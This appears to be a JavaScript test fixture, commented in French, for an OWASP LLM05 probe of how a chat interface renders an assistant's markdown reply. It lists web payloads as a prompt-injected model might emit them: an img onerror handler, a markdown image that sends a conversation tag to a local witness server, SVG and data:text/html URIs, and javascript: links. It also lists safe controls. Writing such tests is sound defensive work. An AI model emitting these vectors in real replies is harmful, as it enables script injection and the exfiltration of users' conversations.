// Étape 1 (OWASP LLM05) — les charges utiles, partagées par les deux sondes.
//
// Une « réponse de l'assistant » piégée, comme le modèle pourrait en produire
// sous l'effet d'une injection. Toutes les charges sont inoffensives : au pire
// elles écrivent un marqueur dans la console, ou appellent le serveur témoin
// local (127.0.0.1:9999), qui ne fait que journaliser.

export const WITNESS = "http://127.0.0.1:9999";

/** Chaque ligne teste un vecteur ; `marqueur` est ce qu'on cherche dans le HTML produit. */
export const CHARGES = [
  {
    id: "html-onerror",
    titre: "HTML brut avec gestionnaire d'événement",
    markdown: `HTML : <img src=x onerror="console.log('SONDE-XSS')">`,
    // Vulnérable si une vraie balise <img ... onerror> apparaît (non échappée).
    vulnerable: (html) => /<img[^>]*onerror/i.test(html),
  },
  {
    id: "image-locale",
    titre: "Image Markdown vers une URL locale (exfiltration)",
    markdown: `Image : ![pixel](${WITNESS}/sonde-image.png?d=conversation-de-bruno)`,
    vulnerable: (html) => /<img[^>]*src="http:\/\/127\.0\.0\.1:9999/i.test(html),
  },
  {
    id: "image-data-svg",
    titre: "Image data: de type SVG (seuls png/jpeg/gif/webp sont admis)",
    markdown: "SVG : ![svg](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciLz4=)",
    vulnerable: (html) => /<img[^>]*src="data:image\/svg/i.test(html),
  },
  {
    id: "lien-javascript",
    titre: "Lien javascript:",
    markdown: "Lien : [clique ici](javascript:console.log('SONDE-JS'))",
    // Vulnérable si le lien reste cliquable, quelle que soit la cible qu'il a reçue.
    vulnerable: (html) => /<a[^>]*>clique ici<\/a>/i.test(html),
  },
  {
    id: "lien-data-html",
    titre: "Lien data:text/html",
    markdown: "Lien : [ouvrir](data:text/html;base64,PHNjcmlwdD5jb25zb2xlLmxvZygnU09OREUtREFUQScpPC9zY3JpcHQ+)",
    vulnerable: (html) => /<a[^>]*>ouvrir<\/a>/i.test(html),
  },
  {
    id: "lien-inconnu",
    titre: "Lien vers une origine inconnue (cliquable sans avertissement)",
    markdown: `Lien : [la documentation](${WITNESS}/sonde-lien?d=conversation-de-bruno)`,
    vulnerable: (html) => /<a[^>]*href="http:\/\/127\.0\.0\.1:9999/i.test(html),
  },
];

/** La réponse complète de l'assistant, telle que le faux flux SSE l'envoie. */
export const REPONSE = ["Voici la réponse demandée.", "", ...CHARGES.map((c) => c.markdown).flatMap((l) => [l, ""])].join("\n");

/**
 * Témoins positifs : ce qui doit CONTINUER de fonctionner après la correction.
 * Une protection qui casse les citations ou toute image n'est pas acceptable.
 */
export const LEGITIMES = {
  markdown: [
    "Selon le règlement [1], la réponse est oui.",
    "",
    "Image intégrée : ![point](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)",
    "",
    "Lien interne : [aide](/aide)",
  ].join("\n"),
  sources: [{ index: 1, fileName: "reglement.pdf", pageStart: 2, pageEnd: 2, score: 0.9, excerpt: "…" }],
  attendus: [
    { id: "citation", ok: (html) => /<a[^>]*class="citation"/.test(html) },
    { id: "image-data-gif", ok: (html) => /<img[^>]*src="data:image\/gif/.test(html) },
    { id: "lien-interne", ok: (html) => /<a[^>]*href="(http:\/\/localhost)?\/aide"/.test(html) },
  ],
};
